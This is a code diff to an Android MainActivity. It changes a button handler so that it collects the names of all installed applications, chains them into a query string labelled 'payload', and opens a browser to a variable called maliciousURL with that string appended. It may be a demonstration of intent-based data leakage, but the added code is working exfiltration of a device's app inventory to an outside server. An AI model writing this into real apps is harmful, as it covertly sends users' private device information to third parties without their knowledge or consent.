@@ -50,7 +50,10 @@ public class MainActivity extends AppCompatActivity {
                 else {
                     for (ApplicationInfo item : list) {
                         if (item.className != null) {
-                            Log.d("MainActivity", item.className);
+                            String fullName = item.className;
+                            String[] tokens = fullName.split("\\.");
+                            Log.d("MainActivity", tokens[tokens.length-1]);
+                            //Log.d("MainActivity", item.className);
                         }
                     }
                 }
@@ -59,7 +62,26 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public void launchBrowser(View v) {
-        String payload = "?q=fromAndroid";
+        PackageManager pm = getApplicationContext().getPackageManager();
+        List<ApplicationInfo> list = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+        String payload = "?q=";
+        if (list.size() == 0) {
+            Log.d("MainActiviy", "Empty");
+            payload += "Empty";
+        }
+        else {
+            for (ApplicationInfo item : list) {
+                if (item.className != null) {
+                    String fullName = item.className;
+                    String[] tokens = fullName.split("\\.");
+                    Log.d("MainActivity", tokens[tokens.length-1]);
+                    payload += tokens[tokens.length-1];
+                    payload += "_";
+                }
+            }
+        }
+        payload += "Done";
+        Log.d("MainActivity", payload);
         Intent intent = new Intent(Intent.ACTION_VIEW);
         intent.setData(Uri.parse(maliciousURL+payload));
         startActivity(intent);
